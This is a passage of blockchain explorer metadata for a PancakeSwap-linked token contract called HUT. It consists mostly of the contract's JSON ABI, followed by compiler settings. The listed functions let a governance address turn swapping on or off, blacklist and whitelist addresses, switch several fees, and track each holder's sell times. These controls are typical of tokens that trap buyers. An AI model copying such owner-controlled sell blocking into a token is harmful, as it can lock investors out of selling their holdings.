},{\"constant\":true,\"inputs\":[],\"name\":\"iscanswap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"isfee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"isfee2\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"isfee3\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"isfee4\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"isfee5\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"isfee6\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"isfeeblk\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"isfeewhit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"lpadress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"maxSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"pancakePair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"pancakeswapV2Router\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellout\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"selltime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_govn\",\"type\":\"address\"}],\"name\":\"setGovernance\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_tf\",\"type\":\"bool\"}],\"name\":\"setIscanswap\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_tf\",\"type\":\"bool\"}],\"name\":\"setIsisfee\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_tf\",\"type\":\"bool\"}],\"name\":\"setIsisfee2\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_tf\",\"type\":\"bool\"}],\"name\":\"setIsisfee3\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_tf\",\"type\":\"bool\"}],\"name\":\"setIsisfee4\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_tf\",\"type\":\"bool\"}],\"name\":\"setIsisfee5\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_tf\",\"type\":\"bool\"}],\"name\":\"setIsisfee6\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_swapTokensAtAmount\",\"type\":\"uint256\"}],\"name\":\"setSwapTokensAtAmount\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_user\",\"type\":\"address[]\"}],\"name\":\"setWeaddress2\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_user\",\"type\":\"address[]\"}],\"name\":\"setblkddress2\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_tf\",\"type\":\"bool\"}],\"name\":\"setisfeeblk\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_tf\",\"type\":\"bool\"}],\"name\":\"setisfeewhit\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_pancakePair\",\"type\":\"address\"}],\"name\":\"setpancakePair\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_pancakeswapV2Router\",\"type\":\"address\"}],\"name\":\"setpancakeswapV2Router\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"}],\"name\":\"setremWteaddress\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"}],\"name\":\"setremblkaddress\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_user\",\"type\":\"address[]\"}],\"name\":\"setwiteeaddress2\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"swapTokensAtAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"token0\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"token1\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"usrbuys\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"witeeArecipient\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"witeeaa\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"witeeaddress\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"witeelen\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "HUT", "CompilerVersion": "v0.5.17+commit.d19bba13", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "000000000000000000000000bdd7ce63a3c438fbf986be1e5fa091e553720c4c", "EVMVersion": "Default", "Library": "", "LicenseType": "GNU GPLv2", "Proxy": "0", "Implementation": "", "SwarmSource": "bzzr://38b2f5951a630cc53ffa24fa94881e4b89dd2fbe94c3d04c793a6e1802296609"}